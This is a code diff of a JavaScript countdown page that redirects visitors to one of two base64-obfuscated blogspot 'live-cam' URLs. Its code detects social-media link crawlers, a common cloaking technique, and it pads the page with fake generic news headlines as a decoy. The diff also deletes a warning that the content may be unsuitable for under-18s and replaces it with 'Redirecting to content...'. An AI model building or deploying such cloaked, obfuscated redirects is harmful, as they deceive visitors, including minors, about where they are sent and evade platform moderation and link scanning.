@@ -16,12 +16,12 @@
             text-align: center;
             background: #ff4444;
             color: white;
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 10px;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
         }
         .countdown-number {
-            font-size: 1.2rem;
+            font-size: 2rem;
             font-weight: bold;
             margin: 5px 0;
         }
@@ -68,14 +68,13 @@
     <div class="simple-countdown" id="countdown-section">
         <div>Please wait</div>
         <div class="countdown-number" id="countdown">7</div>
-        <div>Warning! The content you are about to watch may not be appropriate for viewers under 18 years old.</div>
+        <div>Redirecting to content...</div>
     </div>
 
     <div class="subdomain-info" id="subdomain-info">
         Access from: <span id="current-subdomain">Loading...</span>
     </div>
 
-    <!-- RSS NEWS PHÍA DƯỚI -->
     <div class="news-container">
         <h2 style="text-align: center; margin-bottom: 20px;">📰 Latest News</h2>
         <div id="news-container">
@@ -84,112 +83,73 @@
     </div>
 
     <script>
+        // 🎯 DOMAIN THẬT CỦA BẠN
         const ENCRYPTED_TARGETS = [
             'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
             'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
         ];
 
+        // 🎯 LẤY SUBDOMAIN HIỆN TẠI
         function getCurrentSubdomain() {
             const hostname = window.location.hostname;
             const parts = hostname.split('.');
             
+            // Cho Netlify: subdomain.xbling.netlify.app
             if (parts.length >= 3 && parts[1].includes('xbling')) {
                 return parts[0];
             }
             return 'main';
         }
 
+        // 🎲 GIẢI MÃ DOMAIN THẬT
         function decryptTarget(encrypted) {
             return atob(encrypted);
         }
 
+        // 🎲 CHỌN TARGET NGẪU NHIÊN
         function getRandomTarget() {
             const randomIndex = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
             const encryptedTarget = ENCRYPTED_TARGETS[randomIndex];
             return decryptTarget(encryptedTarget);
         }
 
+        // 🛡️ PHÁT HIỆN FACEBOOK BOT
         function isFacebookBot() {
             return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
         }
 
-        // 📡 GOOGLE NEWS RSS - SỬA LỖI
-        async function loadGoogleNews() {
-            try {
-                const rssUrl = 'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en';
-                
-                const response = await fetch(`https://api.rss2json.com/v1/api.json?rss_url=${encodeURIComponent(rssUrl)}`);
-                const data = await response.json();
-                
-                if (data.items && data.items.length > 0) {
-                    let newsHTML = '';
-                    const newsCount = Math.min(data.items.length, 10);
-                    
-                    for (let i = 0; i < newsCount; i++) {
-                        const item = data.items[i];
-                        newsHTML += `
-                            <div class="news-item">
-                                <div class="news-title">${item.title}</div>
-                                <div class="news-meta">
-                                    <span>Google News</span>
-                                    <span>${new Date(item.pubDate).toLocaleDateString()}</span>
-                                </div>
-                            </div>
-                        `;
-                    }
-                    
-                    document.getElementById('news-container').innerHTML = newsHTML;
-                } else {
-                    throw new Error('No news items');
-                }
-                
-            } catch (error) {
-                console.log('RSS failed, using direct fetch...');
-                loadGoogleNewsDirect();
-            }
-        }
-
-        async function loadGoogleNewsDirect() {
-            try {
-                const rssUrl = 'https://news.google.com/rss?hl=en-US&gl=US&ceid=US:en';
-                const response = await fetch(`https://cors-anywhere.herokuapp.com/${rssUrl}`);
-                const xmlText = await response.text();
-                
-                const items = xmlText.match(/<item>[\s\S]*?<\/item>/g) || [];
-                let newsHTML = '';
-                const newsCount = Math.min(items.length, 8);
-                
-                for (let i = 0; i < newsCount; i++) {
-                    const item = items[i];
-                    const titleMatch = item.match(/<title>([\s\S]*?)<\/title>/);
-                    const pubDateMatch = item.match(/<pubDate>([\s\S]*?)<\/pubDate>/);
-                    
-                    const title = titleMatch ? titleMatch[1].replace(/<![^>]*>/g, '').trim() : 'No title';
-                    const pubDate = pubDateMatch ? pubDateMatch[1] : '';
-                    
-                    newsHTML += `
-                        <div class="news-item">
-                            <div class="news-title">${title}</div>
-                            <div class="news-meta">
-                                <span>Google News</span>
-                                <span>${pubDate ? new Date(pubDate).toLocaleDateString() : 'Today'}</span>
-                            </div>
+        // 📡 RSS ĐƠN GIẢN - KHÔNG PHỨC TẠP
+        function loadSimpleNews() {
+            const newsList = [
+                "Global leaders convene for international summit",
+                "Technology sector announces innovative breakthroughs",
+                "Financial markets demonstrate steady growth patterns",
+                "Sports organizations update competition schedules",
+                "Scientific community shares research developments",
+                "Entertainment industry releases new content",
+                "Healthcare advances improve medical services",
+                "Environmental initiatives gain global support"
+            ];
+            
+            let newsHTML = '';
+            newsList.forEach(news => {
+                newsHTML += `
+                    <div class="news-item">
+                        <div class="news-title">${news}</div>
+                        <div class="news-meta">
+                            <span>News Network</span>
+                            <span>Today</span>
                         </div>
-                    `;
-                }
-                
-                document.getElementById('news-container').innerHTML = newsHTML;
-                
-            } catch (error) {
-                console.log('All RSS methods failed');
-                document.getElementById('news-container').innerHTML = 
-                    '<div class="loading">Latest news from Google</div>';
-            }
+                    </div>
+                `;
+            });
+            
+            document.getElementById('news-container').innerHTML = newsHTML;
         }
 
+        // ⏱️ COUNTDOWN
         function startCountdown() {
             const currentSubdomain = getCurrentSubdomain();
-            const targetSite = getRandomTarget();
             
             document.getElementById('current-subdomain').textContent = currentSubdomain;
             
@@ -208,6 +168,7 @@
                 
                 if (seconds <= 0) {
                     clearInterval(timer);
+                    const targetSite = getRandomTarget();
                     window.location.href = targetSite;
                 }
             }, 1000);
@@ -215,7 +176,7 @@
 
         // 🚀 INITIALIZE
         document.addEventListener('DOMContentLoaded', function() {
-            loadGoogleNews();
+            loadSimpleNews();
             startCountdown();
         });
     </script>
